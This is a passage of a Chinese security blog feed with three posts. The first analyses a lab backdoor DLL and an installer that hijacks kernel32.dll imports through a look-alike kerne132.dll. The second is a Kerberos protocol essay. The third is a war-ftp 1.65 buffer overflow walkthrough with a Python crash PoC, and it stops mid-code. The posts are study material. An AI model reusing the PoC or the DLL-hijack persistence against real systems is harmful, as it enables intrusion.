<p>之后可以看到send发送了buf缓冲区里面的数据，buf指向的是字符串hello，这是一个受害主机连上远程服务器的第一件做的事情，目的就是让远程服务器知道受害主机已经准备好接收命令。</p>
<p><img src="https://s1.ax1x.com/2020/07/20/Uffd9f.png" alt="Uffd9f.png"></p>
<p>之后又重新用buf来保存接收数据的，调用recv函数来等待服务器的命令。</p>
<p><img src="https://s1.ax1x.com/2020/07/20/Ufh82T.png" alt="Ufh82T.png"></p>
<p>之后来比较缓冲区内接收到的来自远程服务器的命令和在程序硬编码中的字符串sleep，如果相等，那么</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UfhNqJ.png" alt="UfhNqJ.png"></p>
<p>程序就会调用sleep函数睡眠0x60000h秒，之后返回到受害主机发送hello之前，再次发送hello，等待新一轮的命令。</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UfhHsg.png" alt="UfhHsg.png"></p>
<p>当和sleep对比不成功的时候，缓冲区数据就会和exec进行对比。</p>
<p><img src="https://s1.ax1x.com/2020/07/22/UTwdFf.png" alt="UTwdFf.png"></p>
<p>当对比exec成功后，则会调用CreateProcessA函数来调用一个新进程，这里最主要的是这个<strong>lpCommandLine</strong>参数，这个指明要创建的进程，而lpCommandLine参数保存在edx中，而edx则是从栈上的局部变量CommandLine传进来的</p>
<p><img src="https://s1.ax1x.com/2020/07/22/UTwDSg.png" alt="UTwDSg.png"></p>
<p>而局部变量CommandLine在之前的程序没有被调用过，但是可以从局部变量栈空间布局上找到线索，可以看到的是局部变量buf是从<strong>0x1000h</strong>上开始接收数据的，而CommandLine则是在栈上<strong>0x0FFBh</strong>开始的。这一下就知道CommandLine从哪里来的了，buf和CommandLine中间有<strong>五个字节</strong>大小的空间来保存接收的命令，后面部分则是给与CommandLine来指定要创建的进程，不难想象，受害主机从服务器接收到的命令格式大致为：<code>exec xxxxxxx</code></p>
<p><img src="https://s1.ax1x.com/2020/07/20/UfTq5d.png" alt="UfTq5d.png"></p>
<p>之后如果sleep和exec命令都没对比成功后，则会看是否为字符q退出命令，如果是则程序退出，不是则睡眠0x60000h时间，然后返回程序发送hello，等待接收新一轮的命令。</p>
<p>这个DLL程序比较简单，目的也很明确，就是一个后门程序，实现后门功能，这允许攻击者通过发送回复给80端口上的一个数据包，来启动一个系统上的可执行文件。但是问题的关键在于，这个DLL程序如何启动运行，这一点就要查看exe程序是如何运行的了。</p>
<p>接下来，分析exe程序：</p>
<p><img src="https://s1.ax1x.com/2020/07/21/UoxjRP.png" alt="UoxjRP.png"></p>
<p>程序一开始先检测argc参数，检测程序启动时是否有两个参数，如果不是2个参数，程序就退出</p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTmpUx.png" alt="UTmpUx.png"></p>
<p>之后这个程序会把argv[1]放到EAX，并且和放到ESI寄存器的<strong>WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</strong>字符串进行比较，只有相同时程序继续执行。</p>
<p>那么此时程序正确的执行方式就是在命令行中输入：</p>
<blockquote>
<p>Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</p>
</blockquote>
<p>继续看下去：</p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTuoVA.png" alt="UTuoVA.png"></p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTuTUI.png" alt="UTuTUI.png"></p>
<p>接下来连续调用<code>CreateFileA</code>，<code>CreateFileMappingA</code>以及<code>MapViewOfFile</code>，这里打开的是<code>kernel32.dll</code>以及<code>Lab07-03.dll</code>，把这两个文件调用内存进行操作，之后是一连续的复杂的对内存的读写操作，靠静态分析这里已经会很难而且没有必要，所以先绕过这段，看之后的程序运行。</p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTKwJP.png" alt="UTKwJP.png"></p>
<p>绕过一大段对内存的比较，计算偏移或者写入内存的操作代码，接下来可以看到使用CloseHandle函数完成了对那两个文件的操作，然后调用了CopyFileA函数，函数复制<code>Lab07-03.dll</code>并把它放到了<code>C:\\windows\\system32\\kerne132.dll</code>，注意这里是数字1，猜测放到这里是为了顶替kernel32.dll，但是如何顶替还得看下面一个值得关注的子函数<code>sub_4011E0</code>这个子函数有一个参数在调用之前压入栈中，就是字符串<code>C:\\*</code></p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTJoVO.png" alt="UTJoVO.png"></p>
<p>用ida pro的f5功能查看子函数<code>sub_4011E0</code>的伪代码，从上面可以看到是调用FindFirstFileA函数在C盘内查找文件，当是一个文件夹的时候，子函数迭代调用，继续查找子文件夹中，而当文件后缀为<code>.exe</code>(在上面代码中asc_403030指向的就是.exe字符串)，则此时会执行<code>sub_4010A0</code>子函数。那么子函数<code>sub_4011E0</code>的功能就明晰了，就是在C盘下找exe文件。现在来查看<code>sub_4010A0</code>子函数有什么功能：</p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTYQJJ.png" alt="UTYQJJ.png"></p>
<p>这个<code>sub_4010A0</code>子函数会把子函数<code>sub_4011E0</code>传进来的exe文件名当<code>CreateFileA</code>参数，然后调用<code>CreateFileMappingA</code>和<code>MapViewOfFile</code>函数，把文件在内存中映射好便于修改，而<code>sub_4010A0</code>子函数的核心代码功能就是上图所示，会在文件中找Str2字符串，这个字符串指向的则是<code>kernel32.dll</code></p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTYWFg.png" alt="UTYWFg.png"></p>
<p>找到之后调用<code>memcpy</code>函数把<code>dword_403010</code>覆盖到之前<code>kernel32.dll</code>字符串的位置上，而<code>dword_403010</code>这个全局变量保存的是：</p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTt639.png" alt="UTt639.png"></p>
<p>这里ida pro没有识别出来这个是个字符串，可以按A键转化为ASCII码</p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTtfHK.png" alt="UTtfHK.png"></p>
<p>那么就好理解了，就是把在C盘找到的exe文件中的<code>kernel32.dll</code>替换成<code>kerne132.dll</code>，这样在启动这些exe文件的时候，原本会载入kernel32.dll，但是此时就会载入kerne132.dll，就实现了后门程序的启动。但是还有一个问题就是这些改动难道不会影响原来文件的使用吗？毕竟载入的dll文件改了，那些原本调用的kernel32.dll导入函数还能调用吗？</p>
<p>这里就想到刚才在Lab07-03.exe程序中绕过分析了把<code>kernel32.dll</code>以及<code>Lab07-03.dll</code>这两个文件调用内存进行操作的过程，现在准备动态运行分析一下：</p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTNTaT.png" alt="UTNTaT.png"></p>
<p>打开procmon，设置过滤条件</p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTUPiD.png" alt="UTUPiD.png"></p>
<p>然后再命令行敲入<code>Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</code></p>
<p><img src="https://s1.ax1x.com/2020/07/21/UTUFRH.png" alt="UTUFRH.png"></p>
<p>可以看到进程Lab07-03.exe启动后全是再C盘遍历查找exe文件</p>
<p><img src="https://s1.ax1x.com/2020/07/22/UTUlWQ.png" alt="UTUlWQ.png"></p>
<p>然后在C:\WINDOWS\system32文件夹下发现了kerne132.dll（这也太难区分了。。）</p>
<p><img src="https://s1.ax1x.com/2020/07/22/UTwsyj.png" alt="UTwsyj.png"></p>
<p>用PEID查看它的导出表，可以发现不再是没有导出函数了，而是导出了原本kernel32.dll的导出函数，是重定向的导出函数，所以实际的功能还是再kernel32.dll中。而检查kernel32.dll的MD5发现前后没有修改过。</p>
<p><img src="https://s1.ax1x.com/2020/07/22/UTai7V.png" alt="UTai7V.png"></p>
<p>在C盘找到一个原本导入kernel32.dll的exe文件，查看现在的导入表，可以发现变成了kerne132.dll，那么就说明后门程序已经植入成功了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次的两个样本Lab07-03.exe和Lab07-03.dll</p>
<p>其中样本Lab07-03.dll，则是一个后门程序，允许攻击者通过在127.26.152.13:80的远程服务器和样本进行通讯，可以执行的命令有：sleep，exec xxxxxx，q，每次样本发送hello来表示自己准备好接收新一轮的命令。</p>
<p>而另一个样本Lab07-03.exe是一个将后门程序Lab07-03.dll植入的样本，它的功能就是通过特殊的启动命令——在命令行输入<code>Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</code>启动程序。然后把Lab07-03.dll和kernel32.dll调入到内存中，对Lab07-03.dll进行修改，在Lab07-03.dll加入重定位的导出函数，导入函数重定位到kernel32.dll中，所以具体的功能还是在kernel32.dll中实现。再然后把Lab07-03.dll重命名为kerne132.dll进行混淆，放入到C:\WINDOWS\system32文件夹下。最后，在C盘搜索遍历exe文件，在exe文件中找到字符串kernel32.dll的位置，并用kerne132.dll替换它，这意味这个exe文件每一次启动都会试图加载后门程序，但因为kerne132.dll含有所有的kernel32.dll的导出函数，这样不至于原来的exe文件无法运行原有的功能。</p>
<p>（好不容易做完了，本来想写博客的是一个实战的样本，但是拖着拖着就忘了当时分析那个样本的思路了，重新完整分析耗时耗力，所以就挑了一个最近在看的书上的实验样本，也算是对之前学习的一个记录总结）</p>
]]></content>
      <categories>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberos协议</title>
    <url>/2020/06/24/Kerberos%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这学期开设的安全协议课程由于疫情影响，期末考试改成论文形式的大报告，思来想去还是准备做一期Kerberos协议的，这个协议在内网域环境中必备，做这个也是为了以后学习内网渗透打打基础（自己太菜了，内网环境是真的复杂，还是自己以前Windows基础没打好）</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="选题背景及意义"><a href="#选题背景及意义" class="headerlink" title="选题背景及意义"></a>选题背景及意义</h3><p>Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。</p>
<p>Kerberos协议保证了用户实体和服务器实体在一个非安全网络中实现身份验证和消息加密，来保证网络中信息的保密性，完整性。还可以用来防止重放攻击。</p>
<p>具体来说，Kerberos协议要解决的问题是：在一个公开网络环境中，网络中的用户希望访问分布在网络中服务器上的服务。我们希望服务器能限制授权用户的访问，并能对服务请求进行鉴别。在这种环境下，服务器和用户的身份如何可信的进行证明。特别地，存在以下三种威胁：</p>
<blockquote>
<p>攻击者可能假装成一个合法授权的用户来访问服务器。</p>
<p>攻击者可能伪装成合法服务器来和合法授权用户进行通信。</p>
<p>攻击者可能窃听报文交换过程，并使用重放攻击来获得进入服务器或打断进行的操作。</p>
</blockquote>
<p>在上述任何一种情况下，一个未授权的用户能够访问他不被授权访问的服务和数据。而Kerberos协议的作用就是为了防止以上三种情况的产生，提供用户和服务器的双向认证，并通过对称加密体系对协议会话进行加密，会话中包含时间戳来防止重放攻击。</p>
<p>目前，Kerberos协议普遍用于公司企业内网的资源管理，所以Kerberos协议的安全关系到公司内网安全。</p>
<h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>在Kerberos协议中主要是有三个角色的存在：</p>
<ul>
<li><p>访问服务的Client</p>
</li>
<li><p>提供服务的Server</p>
</li>
<li><p>KDC（Key Distribution Center）密钥分发中心</p>
</li>
</ul>
<p>而KDC又分为两个部分：</p>
<ul>
<li><p>Authentication Server(AS)：用来验证client的身份，验证通过则会给用户发送一张TGT（Ticket Granting Ticket）票给Client。</p>
</li>
<li><p>Ticket Granting Server(TGS)：TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票ST（Service Ticket）</p>
</li>
</ul>
<p>接下来介绍Kerberos协议的整体流程，Kerberos协议整体可以分为下面三个步骤：</p>
<p><strong>鉴别服务-&gt;服务授权-&gt;获取服务</strong></p>
<p><strong>鉴别服务：</strong></p>
<p>在鉴别服务中，Client首先向认证服务器AS发送用户ID，同时Client本地运行一个单向hash函数把用户密码转换成密钥，这个就是Client的用户密钥(user’s secret key)。而AS通过接收到的用户ID在本地数据库中查询到该用户的密码，利用相同的单向hash函数将密码转化成用户密钥(user’s secret key)。</p>
<p>如果AS确定在本地数据库中查询到了该用户ID，那么会返回用户两条消息：</p>
<ul>
<li><p>消息A：<strong>Client/TGS会话密钥(Client/TGS Session Key)</strong>（该Session Key用在将来Client与TGS的通信上），通过<strong>用户密钥(user’s secret key)</strong>进行对称加密</p>
</li>
<li><p>消息B：<strong>票据授权票据(TGT)</strong>（TGT包括：消息A中的“Client/TGS会话密钥”(Client/TGS Session Key)，用户ID，用户地址，TGT有效期），通过<strong>TGS密钥(TGS’s secret key)</strong>进行对称加密</p>
</li>
</ul>
<p>一旦Client收到消息A和消息B，Client首先通过用户密钥(user’s secret key)解密消息A，从而得到消息A中的“Client/TGS会话密钥”(Client/TGS Session Key)，用来和TGS进行通信。</p>
<p><strong>服务授权：</strong></p>
<p>当Client需要申请服务时，则向TGS发送以下两条消息：</p>
<ul>
<li><p>消息C：即消息B的内容（TGS’s secret key加密后的TGT），和想获取的服务ID</p>
</li>
<li><p>消息D：<strong>认证符（Authenticator）</strong>，其包括用户ID，用户地址，时间戳，认证符用<strong>Client/TGS会话密钥(Client/TGS Session Key)</strong>进行对称加密</p>
</li>
</ul>
<p>当TGS收到消息C和消息D后，TGS首先会检查KDC数据库中是否存在所需服务，查找到之后，TGS用自己的<strong>TGS密钥(TGS’s secret key)</strong>来解密消息C中的TGT从而得到<strong>Client/TGS会话密钥(Client/TGS Session Key)</strong>，然后TGS再使用这个会话密钥解密消息D得到包含用户ID和时间戳的Authenticator，并对TGT和Authenticator进行验证，验证通过之后会返回2条消息：</p>
<ul>
<li>消息E：<strong>client-server票据(client-to-server ticket)</strong>（该ticket包括：Client/Server会话密钥 (Client/Server Session Key），用户ID，用户地址，票据有效期），通过提供该服务的<strong>服务器密钥(service’s secret key)</strong>进行对称加密</li>
<li>消息F：<strong>Client/Server会话密钥 (Client/Server Session Key）</strong>（该Session Key用在将来Client与Server的通信上）<strong>，</strong>通过<strong>Client/TGS会话密钥(Client/TGS Session Key)</strong>进行对称加密</li>
</ul>
<p>Client收到这些消息后，用<strong>Client/TGS会话密钥(Client/TGS Session Key)</strong>解密消息F，得到<strong>Client/Server会话密钥 (Client/Server Session Key）。</strong></p>
<p><strong>获取服务：</strong></p>
<p>当获取到Client/Server会话密钥(Client/Server Session Key)之后，Client就能够使用Server提供的服务了。Client向指定Server发出2条消息：</p>
<ul>
<li><p>消息G：即上一步中的消息E中client-server票据(client-to-server ticket)，通过<strong>服务器密钥(service’s secret key)</strong>进行对称加密</p>
</li>
<li><p>消息H：新的<strong>Authenticator</strong>（包括：用户ID，用户地址，时间戳），通过<strong>Client/Server会话密钥(Client/Server Session Key)</strong>进行对称加密</p>
</li>
</ul>
<p>Server用自己的密钥（service’s secret key）解密消息G，从而得到TGS提供的Client/Server会话密钥(Client/Server Session Key)。再用这个密钥解密消息H得到Authenticator，对Ticket和Authenticator进行验证，验证通过则返回一条消息：</p>
<ul>
<li>消息I：<strong>时间戳</strong>，该时间戳（用Authenticator中时间戳）使用<strong>Client/Server会话密钥(Client/Server Session Key)</strong>进行对称加密</li>
</ul>
<p>Client通过Client/Server会话密钥(Client/Server Session Key)解密消息I，得到时间戳验证其是否正确。验证通过则确定Server正确，并向Server请求服务，Server向Client响应相关服务。</p>
<p><img src="https://s1.ax1x.com/2020/06/24/NaHxMR.png" alt="NaHxMR.png"></p>
<h3 id="发展历程"><a href="#发展历程" class="headerlink" title="发展历程"></a>发展历程</h3><p>麻省理工学院研发Kerberos协议来保护雅典娜工程（Project Athena）提供的网络服务器。目前该协议存在一些版本，版本1-3都只有麻省理工内部发行。Kerberos版本4的主要设计者Steve Miller和Clifford Neuman，在19世纪80年代后期发布这个版本。这个版本主要针对雅典娜工程。版本5由John Kohl和Clifford Neuman设计，在1993年作为 RFC 1510 颁布（在2005年由 RFC 4120 取代），目的在于克服版本4的局限性和安全问题。</p>
<p>在2005年，互联网工程任务组（IETF）Kerberos工作小组更新了规范，更新包括：</p>
<blockquote>
<p>Kerberos 5加密和校验和规范”（RFC 3961）。</p>
<p>Kerberos 5高级加密标准（AES）加密”（RFC 3962）。</p>
<p>Kerberos网络认证服务（版本5）”（RFC 4120）—Kerberos版本5规范的新版本。这个版本废弃早先的 RFC 1510，用更细化和明确的解释说明协议的一些细节和使用方法。</p>
<p>Kerberos 5通用安全服务应用程序接口（GSS-API）机制：版本2”（RFC 4121）—通用安全服务应用程序接口（GSS-API）规范的新版本。</p>
</blockquote>
<p>Windows 2000和后续的操作系统使用Kerberos为其默认认证方法。RFC 3244 “微软Windows 2000 Kerberos变更密码与设置密码协议” 记录整理一些微软对Kerberos协议软件包的添加。RFC 4757 记录整理微软对RC4密码的使用。虽然微软使用Kerberos协议，却并没有用麻省理工的软件。</p>
<p>苹果的Mac OS X也使用Kerberos的客户和服务器版本。Red Hat Enterprise Linux 4和后续的操作系统使用Kerberos的客户和服务器版本。</p>
<h3 id="相关应用"><a href="#相关应用" class="headerlink" title="相关应用"></a>相关应用</h3><p>麻省理工在版权许可的情况下，制作一个Kerberos的免费实现工具，这种情况类似于BSD。在2007年，麻省理工组成一个Kerberos协会，以此推动Kerberos的持续发展。</p>
<p>因为使用数据加密标准（DES）加密算法（用56 bit的密钥），美国出口管制当局把Kerberos归类为军需品，并禁止其出口。</p>
<p>一个非美国设计的Kerberos版本4的实现工具KTH-KRB由瑞典皇家工学院研制，它使得这套系统在美国更改密码出口管理条例前（大约是在2000年），在美国境外就可以使用。瑞典的实现工具基于一个叫做eBones的版本，而eBones基于麻省理工对外发行的基于Kerberos版本4的补丁9的Bones（跳过加密公式和对它们的函数调用）。这些在一定程度上决定Kerberos为什么没有被叫做eBones版。</p>
<p>Kerberos版本5的实现工具，Heimdal，基本上也是由发布KTH-KRB的同一组人发布。</p>
<h3 id="总结与展望"><a href="#总结与展望" class="headerlink" title="总结与展望"></a>总结与展望</h3><p>Kerberos协议解决了域环境下用户和服务器之间的双向认证，认证依赖于可信第三方KDC，KDC一般安装在域控服务器上，实现对域内资源和权限的管理。</p>
<p>用户想要获取域内服务器提供的服务，则必须在KDC中的AS认证其身份，获取TGT，通过TGT来向TGS获取服务Ticket，最终通过服务Ticket向Server获取服务。</p>
<p>可以发现，在整个流程中，协议会话内容通过临时的会话密钥加密（票据使用的TGS密钥和服务器密钥可以通过KDC周期的密钥分发来更改，且整个域环境中加密最多的还是使用Client/Server会话密钥加密的client和server的会话数据，而用户密钥的安全取决于用户个人的密钥管理），包括之后用户和服务器建立服务会话时也使用的是Client/Server会话密钥，这一举措大大提高了安全性，对一个加密系统而言，某个实体的Long-term Key加密的数据不应该在网络中传递，所有的加密算法都不能保证100%的安全，对加密的数据进行解密只是一个时间的过程，最大限度地提供安全保障的做法就是：使用一个Short-term key（Session Key）代替Long-term Key对数据进行加密，使得恶意用户对其解密获得加密的Key时，该Key早已失效。</p>
<p>而且整个Kerberos协议认证用户和服务器的身份都建立在于用户与KDC之间，服务器与KDC之间，存在一个只有双方知晓的秘密（就是用户密钥，服务器密钥以及TGS密钥），通过这个秘密来确定对方的身份是可信的。Kerberos协议整个会话过程中，都加入了时间戳机制用来防止重放攻击，而且对票据的有效期做了限定，有效期具有合适的期限，主要取决于在可用性和安全性之间的平衡。</p>
<p>目前Kerberos协议已经发展到了第五版，安全性和实用性得到了极大的提高，区别于第四版，在加密算法的选择上，第五版不局限于DES加密，可以有多种加密方式进行选择。且第五版不同于第四版票据有效期最大只有1280分钟，第五版可以自主设定票据的开始时间和结束时间，在票据的有效期上更加灵活。且第五版不再具有双重加密的问题，避免了计算上的浪费。整体来说第五版的Kerberos协议比第四版要更加安全实用。</p>
<p>但是目前来说Kerberos协议还有很大的发展空间，比如来说，目前针对于Kerberos协议的攻击包括黄金票据TGT和白银票据TGS的伪造，这些伪造依赖于krbtgt NTLM hash和server NTLM hash的泄漏，攻击者通过对域环境的渗透，获取到域内账户（包括krbtgt账户）的hash，利用工具来伪造票据，达到对内网的攻击。针对于此，可以通过开启PAC (Privileged Attribute Certificate) 特权属性证书保护功能，开启PAC后，PAC会将client发送的票据ticket发送给KDC，由KDC来进行验证ticket是否有效，就可以使所伪造的票据无法进行利用，从而防止了白银票据的伪造。</p>
]]></content>
      <categories>
        <category>安全协议</category>
      </categories>
      <tags>
        <tag>Kerberos</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区溢出攻击和实战war-ftp</title>
    <url>/2020/06/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%92%8C%E5%AE%9E%E6%88%98war-ftp/</url>
    <content><![CDATA[<h1 id="缓冲区溢出攻击和实战war-ftp"><a href="#缓冲区溢出攻击和实战war-ftp" class="headerlink" title="缓冲区溢出攻击和实战war-ftp"></a>缓冲区溢出攻击和实战war-ftp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        最近看到看雪学院有篇<a href="https://bbs.pediy.com/thread-259883.htm" target="_blank" rel="noopener">博客</a>写的FUZZ测试和漏洞利用，里面有介绍war-ftp 1.65版本存在缓冲区漏洞，之前有做过war-ftp 1.65的缓冲区攻击，不过当时应付差事，匆忙一做，最近学了一段时间的逆向，现在重新做做，重新理解一下。(本来这篇博客快做好了，想着有些累就睡觉了，结果一觉醒来上传到搜狗图床的图没了，淦，结果又重做了一次截了图，思路都打断了，MD)</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是缓冲区溢出</h3><p>这里引用一下百度的解释</p>
<blockquote>
<p>​        缓冲区溢出是指当计算机向缓冲区内填充数据位数时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。理想的情况是：程序会检查数据长度，而且并不允许输入超过缓冲区长度的字符。但是绝大多数程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下隐患。操作系统所使用的缓冲区，又被称为“堆栈”，在各个操作进程之间，指令会被临时储存在“堆栈”当中，“堆栈”也会出现缓冲区溢出。</p>
</blockquote>
<p>解释的很到位，但是如果了解学习过逆向和汇编的同学，我觉得下面这张图(从上面介绍的那篇博客中引用)可能会有帮助：</p>
<p><img src="https://s1.ax1x.com/2020/06/22/N8HFII.png" alt="N8HFII.png"></p>
<p>原博主的话：</p>
<blockquote>
<p>​        图中函数F1在调用F2之前，F1会保存F2结束以后的返回地址，然后移交给F2执行，F2执行完毕后，根据记录的返回地址复原栈帧，继续执行F1函数。在图1中可以看出，当向一个有栈溢出漏洞的程序发送大量数据时，ESP、EBP等寄存器都可以被垃圾数据淹没。由于EIP寄存器存放下一条指令的地址，因此可以编写一个Exploit程序，使EIP指向预设的一段叫做Shellcode的指令，从而达到控制系统的目的。由于栈的布局原因，通常使用JMP ESP指令来覆盖返回地址，并且将Shellcode存放到ESP处，从而引导CPU执行Shellcode。</p>
</blockquote>
<p>在函数被调用的的过程中，首先将参数放到寄存器或者压入栈中，然后调用call，对于栈来说：</p>
<blockquote>
<p>PUSH EIP</p>
<p>PUSH EBP</p>
<p>MOV EBP,ESP</p>
</blockquote>
<p>那么此时EBP所指向的地址中保存的就是old EBP的值，用来之后恢复栈，然后call之后会在栈中压入此时执行函数的局部变量，函数执行完毕时， 可以调用leave指令当结语，也可以调整ESP的位置，释放局部变量，最后使用ret指令返回，将CPU的控制权由被调函数返回给调用函数，对于栈结构来说则会：</p>
<blockquote>
<p>MOV ESP,EBP</p>
<p>POP EBP</p>
<p>POP EIP</p>
</blockquote>
<p><img src="https://s1.ax1x.com/2020/06/22/N8HmQS.png" alt="N8HmQS.png"></p>
<h3 id="如何利用缓冲区溢出"><a href="#如何利用缓冲区溢出" class="headerlink" title="如何利用缓冲区溢出"></a>如何利用缓冲区溢出</h3><p>​        如果被调用函数的局部变量超过了程序给它分配的空间，因为数据是从较低内存地址向较高内存地址增长的，而栈的结构是从较高内存地址向较低内存地址增长的，那么此时数据就会覆盖掉用来恢复原本栈结构的EIP内容，造成被调函数返回时，调用函数不能正确的恢复EIP的内容。</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJON3n.png" alt="NJON3n.png"></p>
<p>​        而此时发现当被调用函数返回时候，寄存器EIP中内容可控，那么攻击者则可以精心构造被调用函数的局部变量，从而使用特定的值来覆盖原本保存EIP的值。</p>
<p>​        为了能让CPU执行shellcode，有一种方式就是利用篡改的EIP的值，让EIP内的值指向JMP ESP指令，从而执行它，而ESP内的值是在POP EIP后，指向比覆盖EIP值的内存地址高的栈空间中，也是就在构造的覆盖EIP字节之后的几个字节中，只要找到偏移量，就可以定位到ESP指向的值，然后来设计shellcode</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJOwuV.png" alt="NJOwuV.png"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>​        这里我们用war-ftp 1.65版本来做实验，这个软件可谓是经典缓冲区溢出攻击靶场软件(笑)，软件是用的类C语言编写的轻量级免费开源的FTP服务器软件，FTP客户端登陆时用户名存在缓冲区溢出漏洞：</p>
<p><img src="https://s1.ax1x.com/2020/06/22/N8HgyD.png" alt="N8HgyD.png"></p>
<p>（上图搜索结果显示password也有缓冲区溢出，看介绍应该是存在Windows 2000系统上，有机会测试测试）</p>
<blockquote>
<p>测试环境：</p>
<p>操作系统：Windows XP SP3</p>
<p>测试软件：war-ftp 1.65</p>
<p>调试软件：Immunity debugger</p>
<p>ip地址：192.168.247.128</p>
</blockquote>
<p>先FUZZ测试一下</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJOy4J.png" alt="NJOy4J.png"></p>
<p>可以看到当username过长时，程序中断崩溃，在immunity debugger上看到：</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJmrvV.png" alt="NJmrvV.png"></p>
<p>寄存器内容被覆盖(EIP内41是A的ASCII码)</p>
<p>这样，我们可以借用网上的POC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, sys</span><br><span class="line"> </span><br><span class="line">target = <span class="string">'192.168.247.128'</span></span><br><span class="line">payload = <span class="string">'A'</span> * int(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Payload length = %s\n"</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_exploit</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.settimeout(<span class="number">1</span>)</span><br><span class="line">    s.connect((target, <span class="number">21</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.send(<span class="string">'user %s\r\n'</span> % payload)</span><br><span class="line">        <span class="keyword">print</span> s.recv(<span class="number">1000</span>)</span><br><span class="line">        s.send(<span class="string">'pass test\r\n'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] server is down"</span></span><br><span class="line">    s.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    send_exploit()</span><br></pre></td></tr></table></figure>

<p>测试结果：</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJnoJs.png" alt="NJnoJs.png"></p>
<p>输入1000时候，服务器崩溃连不上，那么说明在上一次500字符用户名的时候就已经出现缓冲区溢出了。</p>
<p>为了确定在字符中第几个能覆盖到EIP和EBP，使用mona插件来生成1000个字符计算偏移：</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJKyKP.png" alt="NJKyKP.png"></p>
<p>生成目录在immunity debugger安装目录下</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJK7rV.png" alt="NJK7rV.png"></p>
<p>用python测试一下pattern</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"></span><br><span class="line">ftp = FTP()</span><br><span class="line">username = <span 